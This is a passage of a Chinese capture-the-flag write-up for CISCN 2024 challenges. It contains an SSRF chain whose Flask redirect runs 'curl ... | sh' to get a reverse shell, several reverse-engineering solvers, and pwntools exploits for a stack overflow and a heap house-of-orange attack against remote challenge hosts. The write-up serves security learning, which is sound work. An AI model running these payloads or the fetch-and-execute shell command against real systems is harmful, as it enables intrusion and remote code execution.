class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_height</span>);<br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$QR</span>, <span class="hljs-variable">$file</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>因为有getimagesize，所以需要加个图片头</p><p>然后通过 dr_catcher_data 调用curl触发ssrf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># dayrui\Fcms\Core\Helper.php</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 调用远程数据 curl获取</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $url</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $timeout 超时时间，0不超时</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $is_log 0表示请求失败不记录到系统日志中</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $ct 0表示不尝试重试，1表示重试一次</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  请求结果值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// curl模式</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;curl_init&#x27;</span>)) &#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$url</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>) == <span class="hljs-string">&quot;https://&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>); <span class="hljs-comment">// 跳过证书检查</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 从证书中检查SSL加密算法是否存在</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ct</span>) &#123;<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0)&#x27;</span> . <span class="hljs-string">&#x27;Gecko/20100101 Firefox/40.0&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;X-Requested-With: XMLHttpRequest&#x27;</span>,<br>            <span class="hljs-string">&#x27;Referer: &#x27;</span>.<span class="hljs-variable">$url</span>,<br>            <span class="hljs-string">&#x27;Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3&#x27;</span>,<br>        ));<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_USERAGENT,<span class="hljs-string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13)Gecko/20080311 Firefox/2.0.0.13&#x27;</span>);<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>总共会请求两次，第一次的时候返回真实图片就好了，第二次再重定向到127.0.0.1</p><p><img src="/img/wp/2024/2024ciscn-easycms_revenge-1.png"></p><p>根据条件修改flask中的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br>counter = <span class="hljs-number">0</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> counter<br><br>    <span class="hljs-keyword">if</span> counter == <span class="hljs-number">0</span>:<br>        counter += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;img.png&#x27;</span>, mimetype=<span class="hljs-string">&#x27;image/png&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> counter == <span class="hljs-number">1</span>:<br>        counter = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>反弹shell后执行readflag</p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h2><p>ida上扣下来的arm汇编代码，丢给gpt翻译一下得到加密逻辑，爆一下就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">lst = [<span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x21b7</span>, <span class="hljs-number">0x1e47</span>, <span class="hljs-number">0x2027</span>, <span class="hljs-number">0x26e7</span>,<br>       <span class="hljs-number">0x10d7</span>, <span class="hljs-number">0x1127</span>, <span class="hljs-number">0x2007</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x1e47</span>,<br>       <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x11f7</span>, <span class="hljs-number">0x2007</span>, <span class="hljs-number">0x1037</span>,<br>       <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x1f17</span>, <span class="hljs-number">0x10d7</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x1017</span>,<br>       <span class="hljs-number">0x1f67</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x1017</span>,<br>       <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1f17</span>, <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x0f47</span>, <span class="hljs-number">0x1127</span>,<br>       <span class="hljs-number">0x1037</span>, <span class="hljs-number">0x1e47</span>, <span class="hljs-number">0x1037</span>, <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1107</span>,<br>       <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x2787</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>        <span class="hljs-keyword">if</span> (((j * <span class="hljs-number">0x50</span>) + <span class="hljs-number">0x14</span>) ^ <span class="hljs-number">0x4D</span>) + <span class="hljs-number">0x1e</span> == lst[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span><br></code></pre></td></tr></table></figure><h2 id="androidso-re"><a href="#androidso-re" class="headerlink" title="androidso_re"></a>androidso_re</h2><p>有两个native函数用来获取key和iv，直接frida hook一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> jni = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>  jni[<span class="hljs-string">&quot;getkey&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getkey is called`</span>);<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;getkey&quot;</span>]();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getkey result=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br><br>  jni[<span class="hljs-string">&quot;getiv&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getiv is called`</span>);<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;getiv&quot;</span>]();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getiv result=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>得到key&#x3D;A8UdWaeq,iv&#x3D;Wf3DLups，加密方式为DES-CBC</p><p><img src="/img/wp/2024/2024ciscn-androidso_re-1.png"></p><p>厨子解一下就好了</p><p><img src="/img/wp/2024/2024ciscn-androidso_re-2.png"></p><h2 id="whereThel1b"><a href="#whereThel1b" class="headerlink" title="whereThel1b"></a>whereThel1b</h2><p>输入随机字符观察加密后的数据，每三位加密得到4位数据，猜是base64，直接爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> whereThel1b<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> hexdigits<br><span class="hljs-keyword">import</span> itertools<br>hexdigits += <span class="hljs-string">&quot;lg&#123;&#125;-&quot;</span><br>combinations = [<span class="hljs-string">&#x27;&#x27;</span>.join(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(hexdigits, repeat=<span class="hljs-number">3</span>)]<br><br>encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>, <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br><br>flag = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&quot;flag&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">14</span>):<br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>        flag[i*<span class="hljs-number">3</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">3</span>] = combo.encode()<br>        ret = whereThel1b.trytry(flag)<br><br>        <span class="hljs-keyword">if</span> ret[i*<span class="hljs-number">4</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>] == encry[i*<span class="hljs-number">4</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>]:<br>            <span class="hljs-built_in">print</span>(flag.decode())<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;</span><br></code></pre></td></tr></table></figure><h2 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h2><p>伪随机数，从当前时间往前爆破seed解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;time.h&gt;</span><br><br><br>unsigned char key[<span class="hljs-number">38</span>] = &#123;<br>    <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x88</span>,<br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4D</span>,<br>    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x78</span><br>&#125;;<br><br>void dump_data(unsigned char* data, size_t size, <span class="hljs-built_in">int</span> <span class="hljs-built_in">type</span>) &#123;<br>    <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>    &#123;   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>)<br>            printf(<span class="hljs-string">&quot;%c&quot;</span>, data[i]);<br>        <span class="hljs-keyword">else</span><br>            printf(<span class="hljs-string">&quot;%d,&quot;</span>, data[i]);<br>    &#125;<br>    printf(<span class="hljs-string">&quot;\n\n&quot;</span>);<br><br>&#125;<br><br>void brute_force() &#123;<br>    size_t length = <span class="hljs-number">38</span>;<br>    unsigned char enc_data[] = <span class="hljs-string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;<br>    unsigned char result[<span class="hljs-number">40</span>], shuffled_result[<span class="hljs-number">40</span>], final_result[<span class="hljs-number">40</span>];<br>    unsigned char shuffle_table[<span class="hljs-number">40</span>];<br><br><br>    unsigned char xor_key1[<span class="hljs-number">38</span>];<br>    unsigned char xor_key2[<span class="hljs-number">38</span>];<br><br>    unsigned <span class="hljs-built_in">int</span> current_time = <span class="hljs-number">1715788800</span>;//(unsigned <span class="hljs-built_in">int</span>)time(NULL);<br>    printf(<span class="hljs-string">&quot;current time: %d\n&quot;</span>, current_time);<br><br>    <span class="hljs-keyword">for</span> (unsigned <span class="hljs-built_in">int</span> seed = current_time; seed &gt;= <span class="hljs-number">0</span>; --seed) &#123;<br>        srand(seed &amp; <span class="hljs-number">0xF0000000</span>);<br><br>        // 异或<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            xor_key1[i] = rand();<br>        &#125;<br><br>        // 生成表<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            shuffle_table[i] = i;<br>        &#125;<br><br>        // 打乱表<br>        <span class="hljs-keyword">for</span> (size_t k = length - <span class="hljs-number">1</span>; k; --k) &#123;<br>            size_t rand_idx = rand() % (k + <span class="hljs-number">1</span>);<br>            unsigned char temp = shuffle_table[k];<br>            shuffle_table[k] = shuffle_table[rand_idx];<br>            shuffle_table[rand_idx] = temp;<br>        &#125;<br><br><br>        // 异或<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            xor_key2[i] = rand();<br>        &#125;<br><br>        // ---------------------------------------------------<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            final_result[i] = enc_data[i] ^ key[i];<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            final_result[i] ^= xor_key2[i];<br>        &#125;<br><br>        // 恢复打乱的数据<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            shuffled_result[shuffle_table[i]] = final_result[i];<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            result[i] ^= xor_key1[i];<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ( result[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;f&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;l&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;a&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;g&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>            dump_data(result, <span class="hljs-number">38</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">int</span> main() &#123;<br>    printf(<span class="hljs-string">&quot;magic........\n&quot;</span>);<br>    brute_force();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><p>func3中存在栈溢出，构造payload，但要小心rbp-0xc8与rbp-0xd0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p=process(&quot;./gostack&quot;)</span><br>p=remote(<span class="hljs-string">&quot;8.147.133.9&quot;</span>,<span class="hljs-string">&quot;39706&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./gostack&quot;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0x4C0995</span>)+p64(<span class="hljs-number">0x1c8</span>)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>+p64(<span class="hljs-number">0x4a0af6</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;message :&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><p>free时存在uaf，edit时允许溢出8字节，使用house of orange将top chunk放进unsorted bin，即可获取libc地址<br>修改malloc_hook为gadget即可获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">count,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    pause()<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(count).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">count,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content&#x27;</span>,<span class="hljs-built_in">str</span>(count).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content&#x27;</span>,data)<br>    pause()<br><br>libc=ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;8.147.131.196&quot;</span>,<span class="hljs-string">&quot;32607&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./orange_cat_diary&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;rotwill&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x1001</span>-<span class="hljs-number">0x70</span>)[:-<span class="hljs-number">1</span>])<br>add(<span class="hljs-number">0x1000</span>)<br>add(<span class="hljs-number">0x68</span>)<br><span class="hljs-comment">#edit(0x60,b&#x27;a&#x27;*0x58+b&#x27;rotwilll&#x27;)</span><br>show()<br>p.readuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-<span class="hljs-number">0x3c510a</span><br>malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>gadget=libc.address+<span class="hljs-number">0xf03a4</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>free()<br>edit(<span class="hljs-number">8</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span 